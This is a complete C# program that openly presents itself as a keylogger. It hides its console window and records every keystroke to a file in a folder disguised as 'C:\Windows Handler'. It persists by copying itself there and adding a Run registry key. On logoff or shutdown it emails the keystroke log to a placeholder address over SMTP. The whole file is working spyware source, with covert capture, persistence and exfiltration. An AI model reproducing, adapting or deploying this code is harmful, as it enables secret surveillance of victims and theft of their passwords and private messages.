using System;
using System.IO;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Mail;
using Microsoft.Win32;

namespace _2Simple_Keylogger
{
    class Program
    {
        public static bool chkSysEve = false;
        public static string path = @"C:\Windows Handler\";
        public static string fPath = @"C:\Windows Handler\Handler.dat";

        public static string appName = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        public static string appExe = Path.GetFileName(appName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        //const int SW_SHOW = 5;
        static void Main(string[] args)
        {
            Program p = new Program();

            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
                File.Create(fPath);
            }
            else if (Directory.Exists(path) && !File.Exists(fPath))
            {
                File.Create(fPath);
            }

            if (!File.Exists(fPath))
            {
                File.Create(fPath);
            }
            else
            {
                p.Spread();
                using (StreamWriter writer = new StreamWriter(fPath))
                {
                    while (chkSysEve == false)
                    {
                        Thread.Sleep(10);
                        for (int i = 0; i < 255; i++)
                        {
                            int keyState = GetAsyncKeyState(i);
                            if (keyState == 1 || keyState == -32767)
                            {
                                SystemEvents.SessionEnding += SystemEvents_SessionEnding;
                                writer.WriteLine((Keys)i);
                                writer.Flush();
                                break;
                            }
                        }
                    }
                }
            }
        }

        static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            chkSysEve = true;
            Program p = new Program();
            switch (e.Reason)
            {
                case SessionEndReasons.Logoff:
                    p.SendMail();
                    break;
                case SessionEndReasons.SystemShutdown:
                    p.SendMail();
                    break;
            }
        }
        private void SendMail()
        {
            Program p = new Program();
            string date = DateTime.Now.ToString(@"dd\/MM h\:mm tt");
            string user = Environment.UserName;

            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.example.com");
                mail.From = new MailAddress("fromEmail@example.com");
                mail.To.Add("toemail@example.com");
                mail.Subject = "Saved keys from " + date;
                mail.Body = "Keystrokes saved from user " + user;

                Attachment attachment;
                attachment = new Attachment(fPath);
                mail.Attachments.Add(attachment);

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("fromEmail@example.com", "PasswordHere");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
        private void Spread()
        {
            if (!File.Exists(path + appExe))
            {
                FileInfo fi = new FileInfo(appName);
                fi.CopyTo(path + appExe);

                RegistryKey rk = Registry.CurrentUser.OpenSubKey
                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.SetValue(appExe, path + appExe);
            }
        }
    }
}
